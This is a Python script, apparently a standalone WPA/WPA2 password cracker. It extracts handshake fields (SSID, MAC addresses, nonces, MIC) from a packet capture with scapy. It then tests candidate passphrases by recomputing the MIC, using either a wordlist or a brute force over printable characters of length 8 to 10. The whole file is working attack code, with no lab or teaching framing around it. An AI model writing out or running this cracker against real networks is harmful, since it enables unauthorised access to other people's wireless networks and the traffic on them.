from scapy.all import rdpcap, EAPOL, Dot11Beacon, Dot11, Raw
import tqdm
import hmac
import hashlib
import binascii
import argparse
import sys
import os
import string
import itertools

CHARSET = ''.join(c for c in string.printable if not c.isspace())
BRUTE_FORCE = False


# PMK Derivation
def pbkdf2_sha1(passphrase, ssid, iterations=4096, dklen=32):
    return hashlib.pbkdf2_hmac('sha1', passphrase.encode(), ssid.encode(), iterations, dklen)

# PTK Expansion
def custom_prf512(pmk, a, b):
    blen = 64
    i = 0
    R = b''
    while len(R) < blen:
        hmacsha1 = hmac.new(pmk, a + b'\x00' + b + bytes([i]), hashlib.sha1)
        R += hmacsha1.digest()
        i += 1
    return R[:blen]

# MIC Calculation
def compute_mic(ptk, eapol):
    key = ptk[:16]
    mic = hmac.new(key, eapol, hashlib.sha1).digest()[:16]
    return mic

# Create B (key expansion seed)
def build_b(ap_mac, sta_mac, anonce, snonce):
    macs = sorted([ap_mac, sta_mac])
    nonces = sorted([anonce, snonce])
    return macs[0] + macs[1] + nonces[0] + nonces[1]

# Load pcap and extract handshake
def extract_handshake_info(capfile):
    packets = rdpcap(capfile)

    ssid = None
    ap_mac = None
    client_mac = None
    anonce = None
    snonce = None
    mic = None
    eapol_payload = None
    message2_found = False

    for pkt in packets:
        if pkt.haslayer(Dot11Beacon) and ssid is None:
            ssid = pkt.info.decode(errors='ignore')
            ap_mac = binascii.unhexlify(pkt[Dot11].addr2.replace(":", ""))

        elif pkt.haslayer(EAPOL):
            if not pkt.haslayer(Dot11):
                continue

            src = pkt[Dot11].addr2.replace(":", "")
            dst = pkt[Dot11].addr1.replace(":", "")
            src_mac = binascii.unhexlify(src)
            dst_mac = binascii.unhexlify(dst)

            if client_mac is None and src_mac != ap_mac:
                client_mac = src_mac

            # Get EAPOL bytes properly
            eapol_bytes = bytes(pkt[EAPOL])
            
            # Parse key info (at offset 5-6 in EAPOL)
            if len(eapol_bytes) < 7:
                continue
                
            key_info = int.from_bytes(eapol_bytes[5:7], byteorder='big')
            
            # Check message types using correct bit positions
            key_ack = bool(key_info & (1 << 7))   # bit 7
            key_mic = bool(key_info & (1 << 8))   # bit 8  
            install = bool(key_info & (1 << 6))   # bit 6
            secure = bool(key_info & (1 << 9))    # bit 9
            
            is_from_ap = (src_mac == ap_mac)

            # Message 1: from AP, ACK=1, MIC=0
            if is_from_ap and key_ack and not key_mic and anonce is None:
                if len(eapol_bytes) >= 49:
                    anonce = eapol_bytes[17:49]  # Nonce at offset 17-48

            # Message 2: from client, MIC=1, Install=0, Secure=0  
            elif not is_from_ap and key_mic and not install and not secure and not message2_found:
                if len(eapol_bytes) >= 97:
                    snonce = eapol_bytes[17:49]    # Nonce at offset 17-48
                    mic = eapol_bytes[81:97]       # MIC at offset 81-96
                    eapol_payload = bytearray(eapol_bytes)
                    eapol_payload[81:97] = b'\x00' * 16  # Zero out MIC field for verification
                    message2_found = True

    if None in [ssid, ap_mac, client_mac, anonce, snonce, mic, eapol_payload]:
        print(ssid, ap_mac, client_mac, anonce, snonce, mic, eapol_payload)
        raise ValueError("⚠️ Could not extract all fields from handshake.")

    return ssid, ap_mac, client_mac, anonce, snonce, mic, bytes(eapol_payload)


def crack_with_bruteforce(ssid, ap_mac, client_mac, anonce, snonce, mic, eapol_payload,
                          charset=CHARSET, min_len=8, max_len=10):
    """Performs an efficient on-the-fly bruteforce attack."""
    print(f"[*] Starting bruteforce attack with charset: '{charset}'")
    print(f"[*] Password length range: {min_len} to {max_len}")
    
    found_password = None

    for length in range(min_len, max_len + 1):
        if found_password: break
        num_combinations = len(charset) ** length
        print(f"\n[*] Generating and testing {num_combinations:,} combinations of length {length}...")
        password_generator = (''.join(p) for p in itertools.product(charset, repeat=length))
       
        label = b"Pairwise key expansion"
        seed = build_b(ap_mac, client_mac, anonce, snonce)

        with tqdm.tqdm(total=num_combinations, unit='pass', desc=f"Length {length}") as pbar:
            for password in password_generator:
                if found_password: break
                pmk = pbkdf2_sha1(password, ssid)
                ptk = custom_prf512(pmk, label, seed)
                calculated_mic = compute_mic(ptk, eapol_payload)

                if calculated_mic.hex() == mic.hex():
                    print(f"[✓] Password found: {password}")
                    return password

                print(f"[-] Tried: {password}")


# Cracking loop
def crack_password_wordlist(ssid, ap_mac, client_mac, anonce, snonce, mic, eapol_payload, passlist_file):
    label = b"Pairwise key expansion"
    seed = build_b(ap_mac, client_mac, anonce, snonce)

    with open(passlist_file, 'r') as f:
        for line in f:
            password = line.strip()
            pmk = pbkdf2_sha1(password, ssid)
            ptk = custom_prf512(pmk, label, seed)
            calculated_mic = compute_mic(ptk, eapol_payload)

            if calculated_mic.hex() == mic.hex():
                print(f"[✓] Password found: {password}")
                return password

            print(f"[-] Tried: {password}")

    print("❌ Password not found in wordlist.")
    return None


def parse_arguments():
    parser = argparse.ArgumentParser(description='WPA/WPA2 Password Cracker')
    parser.add_argument('cap_file', help='Path to the capture file (.cap)')
    parser.add_argument('--passlist_file', help='Path to the password wordlist file')
    parser.add_argument('--max_len',type=int, help='Maximum length of brute-forced password')
    parser.add_argument('--min_len',type=int, help='Minimum length of brute-forced password')
    return parser.parse_args()


def validate_files(cap_file, passlist_file):
    if not os.path.exists(cap_file):
        print(f"[ERROR] Capture file not found: {cap_file}")
        sys.exit(1)
    
    if passlist_file and not os.path.exists(passlist_file):
        print(f"[ERROR] Password list file not found: {passlist_file}")
        sys.exit(1)

if __name__ == "__main__":
    args = parse_arguments()
    validate_files(args.cap_file, args.passlist_file)
    
    try:
        print(f"[*] Using capture file: {args.cap_file}")
        if args.passlist_file:
            print(f"[*] Using password list: {args.passlist_file}")
        else:
            BRUTE_FORCE = True

        print("[*] Extracting handshake data...")
        
        ssid, ap_mac, client_mac, anonce, snonce, mic, eapol_payload = extract_handshake_info(args.cap_file)

        print(f"[*] SSID: {ssid}")
        print(f"[*] AP MAC: {ap_mac.hex()}")
        print(f"[*] Client MAC: {client_mac.hex()}")
        print(f"[*] MIC: {mic.hex()}")
        print("EOPL:", eapol_payload.hex())

        print("[*] Starting password cracking...")
        if BRUTE_FORCE:
            max_len = args.max_len if args.max_len is not None else 10
            min_len = args.min_len if args.min_len is not None else 8
            crack_with_bruteforce(ssid, ap_mac, client_mac, anonce, snonce, mic, eapol_payload, max_len=max_len, min_len=min_len)
        else:
            crack_password_wordlist(ssid, ap_mac, client_mac, anonce, snonce, mic, eapol_payload, args.passlist_file)

    except Exception as e:
        print(f"[ERROR] {e}")
